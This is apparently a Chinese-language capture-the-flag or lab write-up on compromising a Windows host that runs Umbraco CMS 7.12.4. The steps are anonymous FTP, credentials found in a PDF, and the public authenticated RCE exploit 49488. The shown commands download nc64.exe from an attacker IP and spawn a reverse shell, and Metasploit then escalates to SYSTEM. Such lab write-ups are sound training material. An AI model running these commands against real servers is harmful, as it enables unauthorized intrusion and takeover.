<img width="1920" height="839" alt="image" src="https://github.com/user-attachments/assets/af86a797-198f-4cbb-9e3f-ea387a23127d" />## nmap scannning
- <img width="1920" height="790" alt="image" src="https://github.com/user-attachments/assets/a66d0886-6d2b-4bb3-8ca7-81a1f5577232" />
- <img width="1920" height="570" alt="image" src="https://github.com/user-attachments/assets/d4001de7-d692-476a-8b0d-157df742b328" />

## 14020 port
- ftp 匿名登入成功，並將 umbraco.pdf 抓下來
  - <img width="1920" height="596" alt="image" src="https://github.com/user-attachments/assets/98cba00e-b69a-403a-9856-312094801434" />
- umbraco.pdf 提到有個 mark@relia.com 和 密碼，並且需將 web02.relia.com、relia.com 加入 hosts
  - <img width="1920" height="859" alt="image" src="https://github.com/user-attachments/assets/33b9ed54-2d9d-476e-8b68-71c28ff352b3" />
  - <img width="1920" height="839" alt="image" src="https://github.com/user-attachments/assets/906c6ea9-b43b-46d3-8a74-e6dc2afbd629" />

## 14080 port
- 需要輸入 FQDN（完整網域名稱）才能訪問
  - <img width="1920" height="837" alt="image" src="https://github.com/user-attachments/assets/1b298059-3031-48bd-8729-29c6927397ce" />
- 發現 /umbraco/#/login 是 umbraco CMS 的登入介面
  - <img width="1920" height="815" alt="image" src="https://github.com/user-attachments/assets/eb765504-0efd-4029-9c1d-96ac0a72589a" />
- 成功用 mark@relia.com、OathDeeplyReprieve91 登入，並且發現 umbraco 的版本為 7.12.4
  - 
- ExploitDB 發現 Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)
  - https://www.exploit-db.com/exploits/49488
  - <img width="1919" height="910" alt="image" src="https://github.com/user-attachments/assets/8c099e9d-306c-4d18-860e-bf41448a0a55" />
- 成功 dir 到檔案
  ```
  python 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i 'http://web02.relia.com:14080/' -c powershell.exe -a 'dir'
  ```
  - <img width="1920" height="790" alt="image" src="https://github.com/user-attachments/assets/04c4de64-f32d-4db5-8cb6-f72c93ca0644" />
- 將 nc.exe 上傳，並取得 reverse shell
  ```
  python 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i 'http://web02.relia.com:14080/' -c powershell.exe -a 'Invoke-WebRequest -Uri http://192.168.45.155:8000/nc64.exe -OutFile /Users/Public/Downloads/nc64.exe'
  python 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i 'http://web02.relia.com:14080/' -c powershell.exe -a '/Users/Public/Downloads/nc64.exe -e cmd.exe 192.168.45.155 4444'
  ```
  - <img width="1920" height="451" alt="image" src="https://github.com/user-attachments/assets/804aadb2-76fa-46eb-bfd6-ac43d4e1d883" />
  - <img width="1288" height="269" alt="image" src="https://github.com/user-attachments/assets/13dff344-b18f-4c7e-98f0-f8944abc06c1" />

## 提權
- metasploit
  - 成功提權成 system
    - <img width="1920" height="670" alt="image" src="https://github.com/user-attachments/assets/b39af03d-1947-40bc-8c97-939a161be4e6" />
- 取得 local.txt
  - <img width="1242" height="601" alt="image" src="https://github.com/user-attachments/assets/1e4be26c-dbcc-42e0-ad94-0e7d94134514" />
- 取得 proof.txt
  - <img width="818" height="125" alt="image" src="https://github.com/user-attachments/assets/27949bc2-0df6-4082-bb56-1042d84e76fe" />














































